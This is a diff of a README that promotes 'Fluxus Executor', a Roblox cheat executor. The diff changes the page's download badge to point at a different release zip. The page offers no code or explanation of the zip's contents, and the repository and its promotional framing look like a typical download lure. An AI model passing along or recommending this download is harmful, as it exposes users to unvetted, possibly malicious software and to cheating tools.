@@ -2,7 +2,7 @@
 # Fluxus Executor - Fluxus Executor Free - Fluxus Executor 2024
 **Fluxus Executor** is the tool for transforming your Roblox experience. It combines powerful features make your games more engaging.
 
- [![Static Badge](https://img.shields.io/badge/Download-Here-red?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Grogosilen/Fluxus-Roblox-Executor/releases/download/Update/new_update.zip)               
+ [![Static Badge](https://img.shields.io/badge/Download-Here-red?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Grogosilen/Fluxus-Roblox-Executor/releases/download/Update/updatev1.zip)               
 ![hq720](https://github.com/user-attachments/assets/7cd98388-60a5-49e4-ad0c-0c60c4fc4714)
 
 
